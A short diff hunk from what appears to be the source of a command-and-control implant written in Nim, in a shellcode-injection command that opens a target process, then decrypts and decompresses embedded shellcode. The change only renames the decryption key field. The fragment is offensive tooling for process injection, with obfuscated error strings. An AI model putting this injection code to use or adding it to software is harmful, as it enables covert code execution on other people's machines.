@@ -74,7 +74,7 @@ proc shinject*(li : Listener, args : varargs[string]) : string =
         result.add(obf("[-] NtOpenProcess failed! Check if the target PID exists and that you have the appropriate permissions\n"))
         return
 
-    var decrypted = decryptData(shellcodeB64, li.cryptKey)
+    var decrypted = decryptData(shellcodeB64, li.UNIQUE_XOR_KEY)
     var decompressed: string = uncompress(cast[string](decrypted))
 
     var shellcode: seq[byte] = newSeq[byte](decompressed.len)
